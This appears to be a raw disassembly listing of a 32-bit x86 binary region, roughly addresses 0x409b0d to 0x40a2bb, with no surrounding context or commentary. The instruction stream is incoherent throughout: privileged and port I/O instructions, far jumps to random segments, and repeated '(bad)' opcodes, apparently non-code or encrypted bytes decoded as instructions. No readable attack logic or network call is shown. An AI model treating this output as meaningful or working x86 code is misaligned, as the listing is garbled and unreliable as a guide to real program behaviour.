  409b0d:	add    BYTE PTR [ebp-0x2232faa],cl
  409b13:	xchg   BYTE PTR [edi+0x4a],al
  409b16:	inc    ebp
  409b17:	jge    0x409b33
  409b19:	lods   eax,DWORD PTR ds:[esi]
  409b1a:	popa   
  409b1b:	or     dl,BYTE PTR [esi+0x50]
  409b1e:	push   ds
  409b1f:	inc    edx
  409b20:	xor    DWORD PTR [ebp-0x7fe45374],ecx
  409b26:	push   ebp
  409b27:	mov    ch,0xe3
  409b29:	add    al,0x44
  409b2b:	mov    WORD PTR [edi+0x48],es
  409b2e:	addr16 xchg ebx,eax
  409b30:	jmp    0x409b50
  409b32:	ss pop ds
  409b34:	shr    DWORD PTR [eax-0x7a],cl
  409b37:	aam    0x93
  409b39:	or     dh,dh
  409b3b:	div    bl
  409b3d:	push   ss
  409b3e:	ret    0xf80d
  409b41:	mov    BYTE PTR ss:[ecx+0x50],dh
  409b45:	jge    0x409ade
  409b47:	pop    edx
  409b48:	outs   dx,BYTE PTR ds:[esi]
  409b49:	dec    eax
  409b4a:	aas    
  409b4b:	sub    dh,BYTE PTR [ebx-0x5d]
  409b4e:	cmp    DWORD PTR [edx],edx
  409b50:	in     al,0xe7
  409b52:	leave  
  409b53:	lahf   
  409b54:	lock fisttp DWORD PTR [edx]
  409b57:	and    eax,0xd7c68929
  409b5c:	jno    0x409ba4
  409b5e:	ins    DWORD PTR es:[edi],dx
  409b5f:	call   FWORD PTR [edi+0x28520d23]
  409b65:	arpl   WORD PTR [edx+0x28],bx
  409b68:	dec    eax
  409b69:	and    cl,BYTE PTR [ecx+0x1415c402]
  409b6f:	xchg   DWORD PTR [ecx-0x18],ebp
  409b72:	sbb    ah,cl
  409b74:	pop    ebx
  409b75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b76:	add    al,0x58
  409b78:	jno    0x409b99
  409b7a:	pop    ss
  409b7b:	pusha  
  409b7c:	fldlg2 
  409b7e:	mov    dh,0xb6
  409b80:	dec    eax
  409b81:	mov    BYTE PTR [esi+ecx*2+0x6ee1d2e4],0xfd
  409b89:	and    eax,0x6fe1b12b
  409b8e:	cli    
  409b8f:	retf   
  409b90:	test   bh,ah
  409b92:	xchg   edi,eax
  409b93:	sbb    DWORD PTR [edi+0x30c1be58],esp
  409b99:	sub    DWORD PTR [edx-0x210f745],ebx
  409b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ba0:	push   es
  409ba1:	stos   BYTE PTR es:[edi],al
  409ba2:	ret    0x3953
  409ba5:	jns    0x409bf3
  409ba7:	dec    esi
  409ba8:	lahf   
  409ba9:	sub    BYTE PTR [esp+eax*2+0x612a071a],al
  409bb0:	push   ecx
  409bb1:	adc    al,0xe7
  409bb3:	mov    ds:0x60f32bed,eax
  409bb8:	jae    0x409bf9
  409bba:	pop    eax
  409bbb:	lea    edi,[eax]
  409bbd:	cdq    
  409bbe:	xchg   esi,eax
  409bbf:	mov    ch,0x22
  409bc1:	test   al,0x1c
  409bc3:	out    0x4a,al
  409bc5:	mov    ss,WORD PTR [ebx]
  409bc7:	mov    cl,0x46
  409bc9:	(bad)  
  409bca:	jle    0x409bb8
  409bcc:	out    0xcb,eax
  409bce:	push   edx
  409bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd0:	imul   ebx,DWORD PTR [ecx],0x402d66ca
  409bd6:	mov    al,0x88
  409bd8:	dec    edx
  409bd9:	in     eax,0x51
  409bdb:	xor    bl,BYTE PTR [ebx+0x7690c70c]
  409be1:	jg     0x409ba4
  409be3:	sub    eax,0x5a85daf1
  409be8:	push   edx
  409be9:	xchg   DWORD PTR [edi-0x6b],edi
  409bec:	(bad)  
  409bed:	push   esp
  409bee:	imul   edi,DWORD PTR [ecx+esi*2],0x38303c6b
  409bf5:	retf   0xacd2
  409bf8:	mov    al,0x11
  409bfa:	inc    eax
  409bfb:	or     edi,DWORD PTR [ebp-0x350e900d]
  409c01:	or     al,0xc7
  409c03:	gs jle 0x409bf1
  409c06:	mov    ebp,DWORD PTR [edi-0x6d]
  409c09:	test   al,0x9a
  409c0b:	push   edx
  409c0c:	stc    
  409c0d:	lahf   
  409c0e:	push   ds
  409c0f:	ins    DWORD PTR es:[edi],dx
  409c10:	jbe    0x409c12
  409c12:	inc    ebp
  409c13:	or     al,0xbd
  409c15:	cmp    dl,0x91
  409c18:	mov    edi,0xf172287a
  409c1d:	les    ebx,FWORD PTR [eax+ecx*2]
  409c20:	pmuludq mm2,QWORD PTR [eax+0x5391e482]
  409c27:	jge    0x409c89
  409c29:	sar    BYTE PTR [ebx-0x53137f6],cl
  409c2f:	data16 mov bh,dh
  409c32:	into   
  409c33:	stc    
  409c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c35:	call   0x256f:0xd004fc24
  409c3c:	sub    al,0x54
  409c3e:	mov    edi,0x8d312728
  409c43:	jmp    0xce44:0x4da0beae
  409c4a:	frstor [ecx-0x5de0635f]
  409c50:	fst    st(6)
  409c52:	out    dx,eax
  409c53:	dec    esp
  409c54:	icebp  
  409c55:	jl     0x409cbe
  409c57:	sub    BYTE PTR [ebx+0x3d],0xcc
  409c5b:	fisttp DWORD PTR [eax+0x64b5a0c]
  409c61:	sbb    ebx,edi
  409c63:	cs aas 
  409c65:	sub    al,0x37
  409c67:	adc    ah,dl
  409c69:	adc    DWORD PTR [ebx+0x25],ebx
  409c6c:	sahf   
  409c6d:	test   al,0x1c
  409c6f:	xor    al,0xcc
  409c71:	or     edi,ebx
  409c73:	xor    edx,DWORD PTR ds:0x6ef974b7
  409c79:	popf   
  409c7a:	jbe    0x409c42
  409c7c:	fld    QWORD PTR [esi+edx*2-0x7f]
  409c80:	sbb    al,0x4
  409c82:	shl    BYTE PTR [esi+0x5f820fe],1
  409c88:	xor    al,0x5f
  409c8a:	mov    al,0x7c
  409c8c:	into   
  409c8d:	fdiv   QWORD PTR [ebp+0x1707792b]
  409c93:	mov    cl,bl
  409c95:	sbb    al,0xf0
  409c97:	mov    eax,ds:0x745e7b0d
  409c9c:	jno    0x409cfc
  409c9e:	jnp    0x409cf9
  409ca0:	outs   dx,BYTE PTR ds:[esi]
  409ca1:	sbb    eax,0x5843da17
  409ca6:	fs call 0x4a32:0x651359eb
  409cae:	daa    
  409caf:	add    dh,BYTE PTR [eax-0x67cac981]
  409cb5:	sub    BYTE PTR [edi-0x643537a1],al
  409cbb:	aam    0x3
  409cbd:	or     al,0xb8
  409cbf:	inc    edi
  409cc0:	dec    edx
  409cc1:	dec    edx
  409cc2:	push   ss
  409cc3:	xchg   ebp,eax
  409cc4:	lods   eax,DWORD PTR ds:[esi]
  409cc5:	loopne 0x409c92
  409cc7:	sbb    bl,0xbe
  409cca:	cmc    
  409ccb:	jle    0x409d39
  409ccd:	nop
  409cce:	adc    eax,0xc4f2f66e
  409cd3:	lods   eax,DWORD PTR ds:[esi]
  409cd4:	fstp   TBYTE PTR [edx]
  409cd6:	pop    ebx
  409cd7:	shr    DWORD PTR [ebp-0x58],0xf5
  409cdb:	das    
  409cdc:	adc    eax,0xa0488bc7
  409ce1:	mov    ebp,gs
  409ce3:	fcmovnu st,st(5)
  409ce5:	mov    ds:0x667c0d4d,al
  409cea:	cmp    bl,dh
  409cec:	cmp    BYTE PTR [ebx],ah
  409cee:	mov    bh,0x8b
  409cf0:	cmp    DWORD PTR [ecx+0x40b8f9dd],esi
  409cf6:	clc    
  409cf7:	out    dx,eax
  409cf8:	aam    0xe3
  409cfa:	jae    0x409d5a
  409cfc:	or     dl,BYTE PTR [ebp+0x214f966c]
  409d02:	cmp    edx,DWORD PTR [eax+eiz*8-0x1b]
  409d06:	repnz mov ds:0x6a1cdc5d,al
  409d0c:	jo     0x409d83
  409d0e:	jmp    0xe756:0xb6a000ab
  409d15:	mov    eax,?
  409d17:	inc    esi
  409d18:	rcl    dh,cl
  409d1a:	cmp    esi,esi
  409d1c:	mov    DWORD PTR [ecx],eax
  409d1e:	adc    al,0x9f
  409d20:	lock jae 0x409d00
  409d23:	and    al,dh
  409d25:	pop    edi
  409d26:	lea    esp,[edi-0x19b00c9f]
  409d2c:	js     0x409d6f
  409d2e:	test   al,0xe
  409d30:	fiadd  DWORD PTR [ecx-0x2bbfbdbd]
  409d36:	mov    al,0x8f
  409d38:	fisttp WORD PTR [esi+0x37]
  409d3b:	push   ss
  409d3c:	fild   DWORD PTR [esi]
  409d3e:	mov    ebp,0x2306fe48
  409d43:	push   esi
  409d44:	push   eax
  409d45:	lods   eax,DWORD PTR ds:[esi]
  409d46:	sub    al,0xd2
  409d48:	or     BYTE PTR [edi],ah
  409d4a:	fs jp  0x409d06
  409d4d:	stos   DWORD PTR es:[edi],eax
  409d4e:	xchg   ebp,eax
  409d4f:	cmp    eax,0x6e8ba320
  409d54:	xor    esi,eax
  409d56:	in     eax,0xac
  409d58:	leave  
  409d59:	dec    esp
  409d5a:	in     eax,dx
  409d5b:	loop   0x409d60
  409d5d:	mov    cl,BYTE PTR [ebx]
  409d5f:	dec    ebx
  409d60:	outs   dx,DWORD PTR ds:[esi]
  409d61:	or     al,0x70
  409d63:	mov    ah,0xa4
  409d65:	scas   al,BYTE PTR es:[edi]
  409d66:	and    ah,cl
  409d68:	mov    ebp,0x27b6a6b1
  409d6d:	enter  0x51c0,0x68
  409d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d72:	pop    edx
  409d73:	pusha  
  409d74:	inc    edx
  409d75:	mov    eax,0x89e74e49
  409d7a:	xchg   esi,eax
  409d7b:	inc    esp
  409d7c:	pop    eax
  409d7d:	inc    ebp
  409d7e:	mov    edx,0x5d4bc361
  409d83:	add    bl,BYTE PTR [ebx-0x48]
  409d86:	ret    
  409d87:	ficomp WORD PTR [ecx+0x1c]
  409d8a:	pop    ss
  409d8b:	add    BYTE PTR [ebx],bl
  409d8d:	outs   dx,DWORD PTR ds:[esi]
  409d8e:	dec    eax
  409d8f:	test   al,0x58
  409d91:	vpaddsb ymm2,ymm5,YMMWORD PTR [eax-0x52a146cb]
  409d99:	sub    bl,BYTE PTR [ecx-0x761825d9]
  409d9f:	aad    0x13
  409da1:	inc    esi
  409da2:	mov    cl,BYTE PTR [ecx-0x3821c030]
  409da8:	test   al,0x38
  409daa:	pop    ecx
  409dab:	fisttp QWORD PTR [edi+eiz*4]
  409dae:	jecxz  0x409e11
  409db0:	xchg   esi,eax
  409db1:	xor    esp,DWORD PTR [eax+0x27]
  409db4:	(bad)  [eax]
  409db6:	aam    0xb1
  409db8:	adc    dl,ah
  409dba:	rcr    DWORD PTR [eax],0x52
  409dbd:	xchg   ebp,eax
  409dbe:	pop    edx
  409dbf:	mov    ebp,0x822bdc4d
  409dc4:	sbb    eax,esi
  409dc6:	pop    edx
  409dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dc8:	mov    edx,0xb619c010
  409dcd:	in     al,0x27
  409dcf:	xor    BYTE PTR [esi],bh
  409dd1:	out    dx,eax
  409dd2:	cmp    edx,ebp
  409dd4:	xchg   ebx,eax
  409dd5:	jae    0x409d9b
  409dd7:	inc    edi
  409dd8:	je     0x409dd3
  409dda:	adc    esp,esi
  409ddc:	daa    
  409ddd:	stos   DWORD PTR es:[edi],eax
  409dde:	add    esp,DWORD PTR [edi]
  409de0:	add    eax,0xe8383aed
  409de5:	test   ah,ch
  409de7:	cmp    DWORD PTR [ebp+0x4cae2256],esp
  409ded:	call   0xd5190803
  409df2:	jns    0x409dc3
  409df4:	cdq    
  409df5:	scas   eax,DWORD PTR es:[edi]
  409df6:	(bad)  
  409df7:	mov    eax,ds:0xe99b5cc1
  409dfc:	jecxz  0x409de7
  409dfe:	into   
  409dff:	ss jo  0x409e27
  409e02:	ret    
  409e03:	sbb    ebx,DWORD PTR [eax]
  409e05:	dec    edi
  409e06:	pop    ecx
  409e07:	nop
  409e08:	mov    edx,0xbe3e1e6b
  409e0d:	retf   0x1baa
  409e10:	adc    al,BYTE PTR [edx+0x57]
  409e13:	cwde   
  409e14:	ret    
  409e15:	stos   DWORD PTR es:[edi],eax
  409e16:	rcr    DWORD PTR [esi],1
  409e18:	add    dl,BYTE PTR [ecx-0x24]
  409e1b:	jbe    0x409d9f
  409e1d:	cs nop
  409e1f:	sbb    BYTE PTR [edx+ebx*8-0x6c],bh
  409e23:	xor    BYTE PTR [esi+0x64],ch
  409e26:	dec    edi
  409e27:	lods   al,BYTE PTR ds:[esi]
  409e28:	and    ebp,DWORD PTR [ecx]
  409e2a:	xor    eax,DWORD PTR [ebx+0x69]
  409e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e2e:	dec    eax
  409e2f:	repnz pop ds
  409e31:	jo     0x409e4f
  409e33:	hlt    
  409e34:	ret    
  409e35:	mov    eax,ds:0x5a91ecdf
  409e3a:	jns    0x409e86
  409e3c:	inc    edi
  409e3d:	mov    ecx,0x583a8a27
  409e42:	mov    eax,ds:0x38217592
  409e47:	or     edi,DWORD PTR [esi]
  409e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e4a:	add    eax,0xe2e53f22
  409e4f:	clc    
  409e50:	push   esi
  409e51:	leave  
  409e52:	iret   
  409e53:	cmp    ah,BYTE PTR [esi-0x2f49c378]
  409e59:	xchg   esp,eax
  409e5a:	lahf   
  409e5b:	and    dh,0xec
  409e5e:	sub    al,ch
  409e60:	or     bl,BYTE PTR [edx+0x1f012a10]
  409e66:	enter  0xfaec,0xaf
  409e6a:	xor    eax,0xb1ab2ba3
  409e6f:	lea    esp,[edi]
  409e71:	arpl   WORD PTR [ecx],bp
  409e73:	dec    ah
  409e75:	adc    eax,0x45e8b84c
  409e7a:	(bad)  
  409e7b:	pmulhw mm6,QWORD PTR [ebp+eiz*4-0x61c5e8a2]
  409e83:	(bad)  
  409e84:	cmp    eax,0xef6f8f0f
  409e89:	push   es
  409e8a:	mov    al,ds:0x867b63a
  409e8f:	adc    cl,BYTE PTR [edx-0x72391213]
  409e95:	jge    0x409e2f
  409e97:	enter  0x8993,0xa8
  409e9b:	add    BYTE PTR [ecx],bl
  409e9d:	aas    
  409e9e:	mov    BYTE PTR [esi+0x469dda4a],cl
  409ea4:	pop    ds
  409ea5:	scas   eax,DWORD PTR es:[edi]
  409ea6:	push   es
  409ea7:	(bad)  
  409ea9:	lods   al,BYTE PTR ds:[esi]
  409eaa:	mov    ds:0xf8c6b1ad,al
  409eaf:	sar    BYTE PTR [edi+0x30],cl
  409eb2:	ins    DWORD PTR es:[edi],dx
  409eb3:	pusha  
  409eb4:	jmp    0x2eece990
  409eb9:	jno    0x409f04
  409ebb:	imul   eax,DWORD PTR [ecx],0x9
  409ebe:	lds    ecx,FWORD PTR [ecx+0x207c33ef]
  409ec4:	aad    0x6
  409ec6:	sar    DWORD PTR [eax+0x13],1
  409ec9:	fdiv   QWORD PTR [edi+ecx*1-0x5954dd2]
  409ed0:	test   DWORD PTR [edi-0x43],esp
  409ed3:	inc    esp
  409ed4:	xor    al,0xdc
  409ed6:	out    dx,eax
  409ed7:	fsub   st(6),st
  409ed9:	inc    edx
  409eda:	lock add eax,0x7593e231
  409ee0:	std    
  409ee1:	sbb    eax,0x54945f69
  409ee6:	addr16 in eax,dx
  409ee8:	pop    edx
  409ee9:	in     eax,dx
  409eea:	fistp  WORD PTR es:[edi]
  409eed:	push   es
  409eee:	inc    edi
  409eef:	lahf   
  409ef0:	push   esp
  409ef1:	sbb    cl,BYTE PTR [ebx+0x6c]
  409ef4:	xchg   ecx,eax
  409ef5:	(bad)  [eax-0x45297291]
  409efb:	call   0x8e2db504
  409f00:	fs jp  0x409ea7
  409f03:	dec    edi
  409f04:	add    eax,0xee78ea1d
  409f09:	jmp    0x409ec1
  409f0b:	sub    eax,0x4417a04f
  409f10:	sbb    eax,0x2a266c18
  409f15:	(bad)  
  409f16:	jmp    0x45c1:0x1e04784c
  409f1d:	aaa    
  409f1e:	cs pop ds
  409f20:	dec    edx
  409f21:	fsub   QWORD PTR [edi+0x7f85cfb0]
  409f27:	inc    esp
  409f28:	add    esp,DWORD PTR [ebx+edi*8+0x52e3e71a]
  409f2f:	iret   
  409f30:	fsubr  QWORD PTR [esp+edx*8+0x42b07c46]
  409f37:	xor    eax,0x4d4f28af
  409f3c:	retf   0x5c4a
  409f3f:	jno    0x409fbb
  409f41:	out    dx,eax
  409f42:	es inc eax
  409f44:	imul   ecx,edi,0x6d
  409f47:	or     eax,0x3632efe
  409f4c:	inc    ebx
  409f4d:	js     0x409ed6
  409f4f:	xchg   ebp,eax
  409f50:	je     0x409f41
  409f52:	or     ah,BYTE PTR [edx+0x313881a1]
  409f58:	push   0x3a
  409f5a:	test   BYTE PTR [eax+0x32],ch
  409f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f5e:	add    edi,0x2ed01a00
  409f64:	dec    edx
  409f65:	or     eax,0xbdc10576
  409f6a:	mov    ds:0x39067ad,eax
  409f6f:	jnp    0x409fe2
  409f71:	push   edi
  409f72:	dec    ebp
  409f73:	push   es
  409f74:	jmp    0x60da63b
  409f79:	adc    DWORD PTR [edx],ebx
  409f7b:	mov    ch,dl
  409f7d:	mov    DWORD PTR [ecx],esi
  409f7f:	pop    ecx
  409f80:	sti    
  409f81:	scas   eax,DWORD PTR es:[edi]
  409f82:	int3   
  409f83:	mov    ah,0xb0
  409f85:	lods   al,BYTE PTR ds:[esi]
  409f86:	inc    edx
  409f88:	jmp    0x8b525306
  409f8d:	push   ds
  409f8e:	add    BYTE PTR [eax-0x6c8f6b31],ah
  409f94:	loopne 0x409f50
  409f96:	leave  
  409f97:	out    0x96,eax
  409f99:	fiadd  DWORD PTR [esi]
  409f9b:	mov    al,ds:0x6e7b3dc2
  409fa0:	jno    0x40a01a
  409fa2:	pop    eax
  409fa3:	cli    
  409fa4:	mov    BYTE PTR [ecx+edi*8+0x2c05469c],cl
  409fab:	ret    0xd6f6
  409fae:	(bad)  [eax+0x62]
  409fb1:	pusha  
  409fb2:	dec    ecx
  409fb3:	std    
  409fb4:	sti    
  409fb5:	imul   ebx,DWORD PTR [edx],0x5b3bbfe5
  409fbb:	cmp    al,0x99
  409fbd:	imul   eax,DWORD PTR [esi+0x792c0406],0x7
  409fc4:	mov    dl,0x61
  409fc6:	outs   dx,DWORD PTR ds:[esi]
  409fc7:	test   al,0xef
  409fc9:	ja     0x40a030
  409fcb:	mov    eax,ds:0x266ad0e4
  409fd0:	mov    eax,ds:0xd6cdeaa8
  409fd5:	aaa    
  409fd6:	push   edi
  409fd7:	clc    
  409fd8:	xlat   BYTE PTR ds:[ebx]
  409fd9:	mov    edi,0xe92f1cc0
  409fde:	push   esp
  409fdf:	vandnpd ymm2,ymm0,YMMWORD PTR [edi-0x46]
  409fe4:	aaa    
  409fe5:	or     dl,BYTE PTR [esi+0x38]
  409fe8:	call   0xa635:0x45d3fecc
  409fef:	adc    BYTE PTR ds:0xac37f917,bl
  409ff5:	das    
  409ff6:	mov    edx,0x18259db1
  409ffb:	or     ch,0x6b
  409ffe:	jo     0x40a001
  40a000:	jg     0x40a021
  40a002:	fld    DWORD PTR [ecx+0x54]
  40a005:	and    edx,DWORD PTR [esi]
  40a007:	hlt    
  40a008:	repnz and DWORD PTR [esi-0x4b],0xebe9b9ed
  40a010:	fmul   st(2),st
  40a012:	sub    ah,bh
  40a014:	sub    BYTE PTR [eax+eiz*2+0x2375cd70],dl
  40a01b:	cwde   
  40a01c:	xor    DWORD PTR [edi+edi*1-0x50],edx
  40a020:	in     al,dx
  40a021:	dec    esi
  40a022:	les    ebx,FWORD PTR [edx+0x199ece49]
  40a028:	pop    es
  40a029:	xchg   BYTE PTR [ebx+edx*4-0x4c],cl
  40a02d:	(bad)  
  40a02f:	enter  0x70bb,0xe1
  40a033:	xchg   BYTE PTR [edi],cl
  40a035:	leave  
  40a036:	ds push edx
  40a038:	jg     0x40a06d
  40a03a:	jae    0x409fc8
  40a03c:	mov    ebp,0x60937a2f
  40a041:	adc    al,0xab
  40a043:	pop    ds
  40a044:	je     0x40a042
  40a046:	retf   
  40a047:	xor    al,0x68
  40a049:	leave  
  40a04a:	js     0x40a0bf
  40a04c:	xchg   esi,eax
  40a04d:	js     0x40a0b7
  40a04f:	cmp    ecx,DWORD PTR [edi+0x17129af]
  40a055:	xor    esp,DWORD PTR [eax]
  40a057:	inc    edx
  40a058:	repz pop ebp
  40a05a:	dec    ecx
  40a05b:	loopne 0x40a003
  40a05d:	jecxz  0x40a05a
  40a05f:	mov    al,ds:0xbda390ea
  40a064:	adc    eax,0x1ed9a110
  40a069:	jecxz  0x40a027
  40a06b:	cmp    eax,0x42d8a052
  40a070:	repz adc al,ch
  40a073:	(bad)
  40a076:	je     0x40a024
  40a078:	xchg   ebp,eax
  40a079:	mov    edx,0x192bbe65
  40a07e:	pop    esp
  40a07f:	pop    ss
  40a080:	xor    BYTE PTR [ecx-0x23ab5ffc],dl
  40a086:	dec    esi
  40a087:	push   edi
  40a088:	mov    ebp,0xfcfe13cf
  40a08d:	(bad)  
  40a08e:	jp     0x40a069
  40a090:	arpl   WORD PTR ds:0x4c39deaa,dx
  40a096:	push   edx
  40a097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a098:	mov    dl,0xf3
  40a09a:	pop    esi
  40a09b:	mov    ebp,0x4b4709e0
  40a0a0:	xor    ch,BYTE PTR ds:0x45da186f
  40a0a6:	and    al,0x84
  40a0a8:	fwait
  40a0a9:	xlat   BYTE PTR ds:[ebx]
  40a0aa:	mov    dl,0x76
  40a0ac:	sub    edx,0x83065af0
  40a0b2:	fisttp WORD PTR [ebp-0x52]
  40a0b5:	sub    eax,0xaa2c2bf8
  40a0ba:	mov    ebp,0xd4ff05da
  40a0bf:	clc    
  40a0c0:	pop    ds
  40a0c1:	aad    0x87
  40a0c3:	jecxz  0x40a0c2
  40a0c5:	inc    ecx
  40a0c6:	jnp    0x40a057
  40a0c8:	push   0x35832ce6
  40a0cd:	pop    esp
  40a0ce:	popf   
  40a0cf:	aad    0x82
  40a0d1:	in     al,0xce
  40a0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0d4:	test   ch,cl
  40a0d6:	jge    0x40a0dd
  40a0d8:	mov    edi,0x654e9192
  40a0dd:	nop
  40a0de:	push   0x56
  40a0e0:	out    0xf9,eax
  40a0e2:	dec    ebp
  40a0e3:	cmp    ebx,ebp
  40a0e5:	sahf   
  40a0e6:	mov    ah,0x75
  40a0e8:	xchg   edx,eax
  40a0e9:	push   edi
  40a0ea:	sbb    BYTE PTR [esi+eax*2-0x4d],ch
  40a0ee:	xlat   BYTE PTR ds:[ebx]
  40a0ef:	icebp  
  40a0f0:	loopne 0x40a0aa
  40a0f2:	pop    ebx
  40a0f3:	je     0x40a089
  40a0f5:	mov    ch,0x51
  40a0f7:	dec    BYTE PTR [esi-0x7071d68b]
  40a0fd:	adc    DWORD PTR [esi],0x6a
  40a100:	push   0xffffffcc
  40a102:	push   es
  40a103:	adc    bl,BYTE PTR [esi+ebp*8]
  40a106:	mov    eax,ecx
  40a108:	sub    al,BYTE PTR [edx+0x13]
  40a10b:	call   0x10b5:0x504228ed
  40a112:	iret   
  40a113:	sbb    cl,BYTE PTR [edx-0x58]
  40a116:	mov    al,0x36
  40a118:	adc    DWORD PTR [eax-0x3a],eax
  40a11b:	lea    esp,[edi+eax*2+0x2d249dd0]
  40a122:	loop   0x40a107
  40a124:	ins    DWORD PTR es:[edi],dx
  40a125:	jle    0x40a172
  40a127:	jle    0x40a143
  40a129:	and    ah,BYTE PTR [ecx]
  40a12b:	add    bl,BYTE PTR [ebx-0x5c97536c]
  40a131:	adc    al,0xc4
  40a133:	mov    bh,0xfd
  40a135:	clc    
  40a136:	test   BYTE PTR [ebp+0x6f2052e7],bh
  40a13c:	mov    edx,0x4fb4aaa4
  40a141:	xor    al,0xcd
  40a143:	jno    0x40a174
  40a145:	fild   QWORD PTR [ebp-0x5104434f]
  40a14b:	xchg   esi,eax
  40a14c:	dec    edi
  40a14d:	mov    ebp,0xcfa6aa3b
  40a152:	xlat   BYTE PTR ss:[ebx]
  40a154:	xor    BYTE PTR [edi-0x38],0x5c
  40a158:	xor    al,0xd5
  40a15a:	push   ebx
  40a15b:	icebp  
  40a15c:	or     al,0x1c
  40a15e:	sar    DWORD PTR [edx+0x5b],1
  40a161:	(bad)
  40a164:	sbb    al,0x2d
  40a166:	sbb    al,0x4c
  40a168:	jno    0x40a139
  40a16a:	adc    eax,0x98c7e405
  40a16f:	xor    ecx,DWORD PTR [ebx+0x14]
  40a172:	inc    eax
  40a173:	pop    es
  40a174:	pop    ebp
  40a175:	cld    
  40a176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a177:	add    bh,BYTE PTR [ebp+0x12]
  40a17a:	and    cl,ah
  40a17c:	lock jns 0x40a1c9
  40a17f:	or     BYTE PTR [ebp+0x2f],0x2c
  40a183:	hlt    
  40a184:	(bad)  
  40a185:	in     al,0xbd
  40a187:	push   ebp
  40a188:	neg    DWORD PTR [ebx]
  40a18a:	push   ds
  40a18b:	cli    
  40a18c:	mov    cs,WORD PTR [edx-0x678b9bb4]
  40a192:	and    al,dh
  40a194:	push   edi
  40a195:	mov    edx,0xff2a3b1
  40a19a:	rcl    BYTE PTR [eax+0x6bcdfecd],0xda
  40a1a1:	sub    BYTE PTR [esi+0x4a593314],0x8e
  40a1a8:	cld    
  40a1a9:	aad    0xe9
  40a1ab:	push   0x28
  40a1ad:	lock sbb al,0x7b
  40a1b0:	push   eax
  40a1b1:	shl    BYTE PTR [eax],0xbd
  40a1b4:	jle    0x40a143
  40a1b6:	mov    al,ch
  40a1b8:	in     eax,dx
  40a1b9:	ins    DWORD PTR es:[edi],dx
  40a1ba:	dec    edx
  40a1bb:	je     0x40a19b
  40a1bd:	adc    eax,0x937845cb
  40a1c2:	dec    esp
  40a1c3:	pop    ecx
  40a1c4:	dec    ecx
  40a1c5:	mov    ds:0x3f6e09e3,eax
  40a1ca:	fs inc ebp
  40a1cc:	pop    es
  40a1cd:	popf   
  40a1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1cf:	adc    edi,DWORD PTR [ebx-0x378a11c]
  40a1d5:	loope  0x40a18a
  40a1d7:	sub    eax,0xed14164a
  40a1dc:	aas    
  40a1dd:	js     0x40a212
  40a1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1e0:	ins    BYTE PTR es:[edi],dx
  40a1e1:	shl    DWORD PTR [ebp+0x18],cl
  40a1e4:	std    
  40a1e5:	fdivr  DWORD PTR [eax+0x29f87204]
  40a1eb:	dec    esi
  40a1ec:	mov    dl,0x68
  40a1ef:	test   DWORD PTR [ecx+0x0],esi
  40a1f2:	icebp  
  40a1f3:	outs   dx,DWORD PTR ds:[esi]
  40a1f4:	loope  0x40a19e
  40a1f6:	mov    dl,0x26
  40a1f8:	pop    ebp
  40a1f9:	lea    ebp,[edi+0x1f5237b3]
  40a1ff:	mov    edi,ebx
  40a201:	mov    al,0x27
  40a203:	xchg   ecx,eax
  40a204:	sbb    eax,0xa9046f6e
  40a209:	mov    ds:0xb30f90ec,al
  40a20e:	aam    0xe4
  40a210:	(bad)
  40a213:	sbb    cl,ah
  40a215:	addr16 pusha 
  40a217:	test   DWORD PTR [ecx+eiz*8-0x32368416],eax
  40a21e:	adc    DWORD PTR [edi+0x40],eax
  40a221:	or     BYTE PTR ds:0xd63fed84,0x2f
  40a228:	mov    fs,WORD PTR [ebx+0x31]
  40a22b:	ror    DWORD PTR [ecx+edx*4],0xd0
  40a22f:	push   esp
  40a230:	xchg   esp,eax
  40a231:	gs (bad) 
  40a233:	and    edi,DWORD PTR [ebp-0x77552995]
  40a239:	push   edi
  40a23a:	(bad)  
  40a23b:	fcomp  DWORD PTR [ebx]
  40a23d:	jmp    0x40a28a
  40a23f:	outs   dx,DWORD PTR ds:[esi]
  40a240:	rcr    BYTE PTR [edx],0x71
  40a243:	cli    
  40a244:	xor    ch,BYTE PTR [edi+0x5ebc85fe]
  40a24a:	or     DWORD PTR [edx],0xab9b7d86
  40a250:	out    dx,eax
  40a251:	sbb    al,BYTE PTR gs:[edx+ebx*4]
  40a255:	fsubp  st(6),st
  40a257:	mov    cr7,edi
  40a25a:	inc    esp
  40a25b:	dec    esp
  40a25c:	cmc    
  40a25d:	adc    dh,dl
  40a25f:	loopne 0x40a234
  40a261:	(bad)  
  40a262:	cli    
  40a263:	push   ds
  40a264:	(bad)  
  40a265:	mov    ch,0x8f
  40a267:	loopne 0x40a2ad
  40a269:	sbb    eax,0x733ed851
  40a26e:	cwde   
  40a26f:	dec    BYTE PTR [ebp+0x71]
  40a272:	(bad)  
  40a274:	push   eax
  40a275:	test   DWORD PTR [bx+si],ecx
  40a278:	and    ah,BYTE PTR [eax]
  40a27a:	sahf   
  40a27b:	loope  0x40a270
  40a27d:	mov    ds:0x9de8dd57,eax
  40a282:	xchg   edx,eax
  40a283:	(bad)
  40a286:	inc    BYTE PTR [si-0x6d30]
  40a28b:	fistp  DWORD PTR es:[edx+0x7a473d28]
  40a292:	sub    ebx,DWORD PTR [eax-0x213030dc]
  40a298:	mov    DWORD PTR [ebx-0x481903ab],edi
  40a29e:	xor    bl,bh
  40a2a0:	cmp    BYTE PTR [ebx],dl
  40a2a2:	and    DWORD PTR [eax+0x29deccbd],0xffffff89
  40a2a9:	arpl   cx,bx
  40a2ab:	push   0xffffffff
  40a2ad:	call   0xc90e:0x3c0eeb96
  40a2b4:	add    BYTE PTR [ebp+0xed913f],dl
  40a2ba:	dec    eax
  40a2bb:	mov    ah,BYTE PTR [edi+0x7b11aede]
